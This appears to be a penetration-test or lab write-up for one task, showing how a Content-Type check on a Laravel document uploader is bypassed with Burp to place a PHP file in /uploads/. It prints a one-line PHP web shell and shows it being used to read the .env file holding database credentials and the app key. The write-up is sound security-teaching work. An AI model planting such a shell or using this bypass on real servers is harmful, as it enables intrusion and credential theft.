# Task 7: File Upload -> RCE

**Vulnerability:** Unrestricted File Upload (CWE-434)
**Endpoint:** `POST /home/upload`

As seen in recon, the document uploader on `/home/upload` rejects PHP files but its
filter trusts the `Content-Type` header supplied in the request rather than inspecting
the file's actual contents. Since the browser sets this header automatically from the
real file type, a normal upload of `shell.php` gets blocked every time. With Burp
intercepting the request we can rewrite the `Content-Type` from `application/x-php`
to `image/png` before it reaches the server. The server sees an apparent image,
accepts the file, and stores it in the publicly accessible `/uploads/` directory
where Apache executes it as PHP. This gives us RCE as `www-data`.

---

## Steps

Create `shell2.php` with the following payload:

```php
<?php echo shell_exec($_GET["cmd"]); ?>
```

Navigate to Upload Documents, select the file but don't submit yet. Turn Intercept
on in Burp, then click Upload Document. The request freezes showing the file part:

<img width="593" height="95" alt="image" src="https://github.com/user-attachments/assets/d6ea8c06-fd2d-44a7-99b6-0d9a5f909bf3" />

Change `application/x-php` to `image/png` and click Forward, then turn Intercept off.
The green success banner confirms the file landed in `/uploads/`:

<img width="749" height="614" alt="image" src="https://github.com/user-attachments/assets/c9bc2de0-31f8-4350-9673-e190b83880c1" />

## Evidence

Verify execution by querying the `cmd` parameter:

<img width="720" height="111" alt="image" src="https://github.com/user-attachments/assets/377a6baa-4ec9-4fc1-83b9-808301ab0d1a" />

Read the `.env` file using `cat` as you would in a normal terminal:

<img width="2480" height="166" alt="image" src="https://github.com/user-attachments/assets/a5a1881d-0031-4a15-bea9-d7fb7071b71f" />

## What this reveals to an attacker

The `.env` file contains the application's database credentials and Laravel app key.
Combined with the `www-data` shell, an attacker has full control over the web server
process and direct access to the backend database.

## Remediation

See [remediation](../remediation.md)
